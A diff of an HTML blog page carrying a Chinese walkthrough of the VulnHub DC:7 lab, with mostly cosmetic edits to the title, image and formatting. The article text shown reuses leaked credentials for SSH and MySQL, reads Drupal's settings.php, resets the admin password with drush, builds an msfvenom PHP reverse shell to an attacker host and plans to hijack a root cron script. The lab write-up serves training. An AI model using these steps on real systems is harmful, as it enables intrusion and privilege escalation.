@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="VulnHub - DC:7, 让我再浪一会">
-    <meta name="description" content="VulnHub - DC:7">
+    <meta name="keywords" content="VulnHub - DC_7, 让我再浪一会">
+    <meta name="description" content="VulnHub - DC_7">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>VulnHub - DC:7 | 让我再浪一会</title>
+    <title>VulnHub - DC_7 | 让我再浪一会</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -290,12 +290,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">VulnHub - DC:7</h1>
+                    <h1 class="description center-align post-title">VulnHub - DC_7</h1>
                 </div>
             </div>
         </div>
@@ -418,10 +418,10 @@
 <p>目前可知可以用于登录的有后台以及 SSH</p>
 <p>测试后台登录</p>
 <p><img src="/../../../../../pic/Pasted%20image%2020230309003043.png"></p>
-<p>题目用户名或密码错误，拿着尝试去登录 SSH</p>
-<p>使用 dc7user / MdR3xOgB7#dW 登录 SSH</p>
+<p>提示用户名或密码错误，拿着尝试去登录 SSH</p>
+<p>使用 <code>dc7user / MdR3xOgB7#dW</code> 登录 SSH</p>
 <p><img src="/../../../../../pic/Pasted%20image%2020230309003154.png"></p>
-<p>成功登录进后台</p>
+<p>成功登录</p>
 <p>继续拿上面泄露出来的账户登录下数据库</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">mysql -udc7user -pMdR3xOgB7#dW<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -431,7 +431,7 @@
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">cat /var/www/html/sites/default/settings.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/../../../../../pic/Pasted%20image%2020230309004010%201.png"></p>
-<p>找到了一个账户 db7user / yNv3Po00</p>
+<p>找到了一个账户 <code>db7user / yNv3Po00</code></p>
 <p>连接数据库</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">mysql -udb7user -pyNv3Po00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -447,7 +447,7 @@
 drush upwd admin --password="password"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/../../../../../pic/Pasted%20image%2020230309005946.png"></p>
-<p>提示修改成功，然后使用 admin / password 成功登入后台</p>
+<p>提示修改成功，然后使用 <code>admin / password</code> 成功登入后台</p>
 <p><img src="/../../../../../pic/Pasted%20image%2020230309010015.png"></p>
 <p>找了一下并没有发现什么 flag 的痕迹，再回到 SSH 看一下</p>
 <p><img src="/../../../../../pic/Pasted%20image%2020230309010105.png"></p>
@@ -462,7 +462,7 @@ drush upwd admin --password="password"<span aria-hidden="true" class="line-numbe
 
 <p><img src="/../../../../../pic/Pasted%20image%2020230309014518.png"></p>
 <p>发现该脚本每 15 分钟自动执行一次</p>
-<p>也就是如果可以控制脚本内容，即可以在自动执行时通过反弹 shell 获得 root 用户权限</p>
+<p>也就是如果可以控制脚本内容，就可以在脚本自动执行时通过反弹 shell 获得 root 用户权限</p>
 <p>查看一下该脚本权限</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">ls -la /opt/scripts/backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -493,7 +493,7 @@ drush upwd admin --password="password"<span aria-hidden="true" class="line-numbe
 <p><img src="/../../../../../pic/Pasted%20image%2020230309012554.png"></p>
 <p>此时回到先前的文章发布功能中</p>
 <p><img src="/../../../../../pic/Pasted%20image%2020230309012625.png"></p>
-<p>可以看到支持了 php 语言</p>
+<p>可以看到支持了 PHP 语言</p>
 <p>在 Body 中写入一句话木马或者反弹一个 shell</p>
 <p>msfvenom 生成一个 PHP 反弹 shell</p>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">msfvenom -p php/reverse_php LHOST=192.168.1.103 LPORT=10010 -f raw &gt; shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -503,9 +503,8 @@ drush upwd admin --password="password"<span aria-hidden="true" class="line-numbe
 <p><img src="/../../../../../pic/Pasted%20image%2020230309013408.png"></p>
 <p>保存文件之后访问</p>
 <p><img src="/../../../../../pic/Pasted%20image%2020230309013456.png"></p>
-<p>接收到反弹 Shell</p>
-<p>获取到了 www-data 用户权限</p>
-<p>接下来可以修改 /opt/scripts/backups.sh 文件内容向其中写入反弹 shell</p>
+<p>接收到反弹 shell，获取到了 <code>www-data</code> 用户权限</p>
+<p>接下来可以修改 <code>/opt/scripts/backups.sh</code> 文件内容向其中写入反弹 shell</p>
 <pre class="line-numbers language-tet" data-language="tet"><code class="language-tet">ls /bin | grep nc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/../../../../../pic/Pasted%20image%2020230309014013.png"></p>
@@ -907,15 +906,15 @@ drush upwd admin --password="password"<span aria-hidden="true" class="line-numbe
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="VulnHub - DC:7">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="VulnHub - DC_7">
                         
-                        <span class="card-title">VulnHub - DC:7</span>
+                        <span class="card-title">VulnHub - DC_7</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            VulnHub - DC:7
+                            VulnHub - DC_7
                         
                     </div>
                     <div class="publish-info">
